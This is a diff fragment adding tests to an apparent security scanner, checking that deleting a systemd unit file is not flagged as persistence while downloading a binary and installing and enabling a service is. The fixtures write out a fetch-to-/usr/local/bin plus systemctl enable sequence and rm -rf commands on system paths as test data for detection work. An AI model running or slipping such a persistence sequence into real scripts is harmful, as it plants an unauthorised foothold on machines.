+    `rm -f /etc/systemd/system/pihole-FTL.service`, and that file was the blocking
+    finding in the repository -- while the real installer beside it was correctly
+    excused as machine provisioning. The persist pattern listed the unit directory as a
+    bare path, and an uninstaller names exactly the same paths as an installer.
+
+    Written as a list of WRITE verbs rather than a list of removal verbs, because the
+    ways to not-write a path are unbounded -- `rm`, `unlink`, `[ -d`, `test -f`,
+    `find -delete` -- and the ways to write one are four.
+    """
+
+    def _persist(self, tmp_path):
+        return [f for f in Scanner().scan(tmp_path).findings if "PERSIST" in f.rule_id]
+
+    def test_removing_a_unit_file_is_not_installing_one(self, tmp_path) -> None:
+        (tmp_path / "uninstall.sh").write_text(
+            "#!/bin/bash\n"
+            "disable_service pihole-FTL\n"
+            "rm -f /etc/systemd/system/pihole-FTL.service &> /dev/null\n"
+            "if [[ -d '/etc/systemd/system/pihole-FTL.service.d' ]]; then\n"
+            "  rm -rf /etc/systemd/system/pihole-FTL.service.d\n"
+            "fi\n"
+            "curl -sSL https://install.example.test/uninstall > /dev/null\n"
+        )
+        assert self._persist(tmp_path) == []
+
+    def test_writing_one_still_is(self, tmp_path) -> None:
+        """The control. A unit file written and enabled is persistence whoever does it;
+        the provisioning ceiling is what keeps an honest installer off the gate."""
+        (tmp_path / "install.sh").write_text(
+            # The fetch is part of the fixture, not decoration: `SUSPECT.PERSIST.001`
+            # asks for a foothold AND something to put in it.
+            "#!/bin/bash\n"
+            "curl -sSL https://install.example.test/agent -o /usr/local/bin/agent\n"
+            "cp agent.service /etc/systemd/system/agent.service\n"
+            "systemctl enable agent.service\n"
+        )
+        assert self._persist(tmp_path)
